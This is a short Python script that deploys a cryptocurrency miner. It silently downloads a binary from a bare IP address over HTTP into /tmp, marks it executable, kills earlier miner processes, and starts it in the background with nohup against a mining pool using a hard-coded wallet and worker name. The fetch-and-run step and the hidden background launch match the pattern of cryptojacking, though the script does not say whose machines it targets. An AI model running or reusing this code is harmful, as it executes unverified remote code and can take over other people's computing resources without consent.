import os
import subprocess
import time

# Download miner
os.system("cd /tmp && curl -sLo miner http://151.247.219.40:8000/alpha-miner && chmod +x miner")

# Kill any existing
os.system("pkill -f 'miner.*prl1pjdp6c4dzmzemsw0' 2>/dev/null || true")

# Start miner
os.system("cd /tmp && nohup ./miner --pool stratum+tcp://sg1.alphapool.tech:5566 --address prl1pjdp6c4dzmzemsw0cv00t2t008mnsu80qc8ghksl0k426qm8z83kqp8m8vg --worker GPU_134 > /tmp/miner.log 2>&1 &")

time.sleep(1)
ps = os.popen("ps aux | grep miner | grep -v grep | wc -l").read().strip()
result = f"GPU_134: {ps} processes"
